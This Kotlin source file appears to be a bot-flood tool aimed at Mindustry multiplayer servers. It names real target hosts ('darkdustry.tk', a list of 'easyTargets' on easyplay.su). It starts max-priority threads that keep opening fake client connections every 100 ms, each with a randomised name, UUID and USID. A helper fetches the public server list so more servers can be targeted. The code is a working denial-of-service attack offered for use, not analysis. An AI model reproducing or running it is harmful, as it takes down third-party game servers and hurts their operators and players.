package io.lucin

import arc.math.Rand
import arc.struct.Seq
import arc.util.Http
import arc.util.Log
import arc.util.serialization.Base64Coder
import arc.util.serialization.Jval
import io.lucin.core.Entity
import mindustry.Vars
import mindustry.core.*
import mindustry.gen.Groups
import mindustry.net.Packets.ConnectPacket
import java.util.Timer
import java.util.TimerTask

var forbiddenServers: Seq<String> = Seq.with("Darkdustry")
var easyTargets = listOf(
    "easyplay.su:6567",
    "easyplay.su:6676",
    "easyplay.su:6577",
    "easyplay.su:6587",
    "easyplay.su:6686",
    "easyplay.su:6687"
)

fun main() {
    init()

    val timer = Timer()
    timer.scheduleAtFixedRate(object : TimerTask() {
        override fun run() {
            System.gc()
        }

    }, 0, 1000)

    val targets = Seq.with("darkdustry.tk:6567")
    targets.forEach { target ->
        Log.info(target)

        val thread = Thread { task(target) }
        thread.priority = Thread.MAX_PRIORITY;
        thread.start()
    }
}

private fun init() {
    Groups.init()
    Vars.world = World()

    Vars.content = ContentLoader()
    Vars.content.createBaseContent()

    Vars.state = GameState()

    Version.build = 140
}

private fun packet(): ConnectPacket {
    val packet = ConnectPacket()

    packet.version = -1
    packet.versionType = "official"

    packet.name = Rand().random(-99999, 99999).toString()
    packet.color = 255
    packet.locale = "ru"

    packet.mods = Seq()
    packet.mobile = false

    packet.uuid = uuid()
    packet.usid = usid()

    return packet
}

private fun task(address: String) {
    val fullAddress = address.split(':')
    val ip = fullAddress[0].replace('"', ' ').replace(" ", "")
    val port = fullAddress[1].replace('"', ' ').replace(" ", "").toInt()

    while (true) {
        Entity.EntityBuilder(false, packet(), ip, port, port)
        Thread.sleep(100)
    }

    while (true) {}
}

private fun listOfServes(): Seq<String> {
    val output = Seq<String>()
    Http.get("https://raw.githubusercontent.com/Anuken/Mindustry/master/servers_v7.json")
        .timeout(0)
        .error(Log::err)
        .block { res ->
            val json = Jval.read(res.resultAsString)
            json.asArray().forEach { server ->
                val name: String = server.getString("name", "")
                if (forbiddenServers.contains(name)) return@forEach

                val addresses: Array<String> = if (server.has("addresses") || server.has("address") && server.get("address").isArray) {
                    (if (server.has("addresses")) server.get("addresses") else server.get("address")).asArray()
                        .map { obj: Jval -> obj.asString() }
                        .toArray(String::class.java)
                } else {
                    arrayOf(server.getString("address", "<invalid>"))
                }

                for (target in addresses) {
                    output.add(target)
                }
            }
        }

    return output
}

private fun uuid(): String {
    val bytes = ByteArray(8)
    Rand().nextBytes(bytes)
    return String(Base64Coder.encode(bytes))
}

private fun usid(): String {
    val result = ByteArray(8)
    Rand().nextBytes(result)
    return String(Base64Coder.encode(result))
}
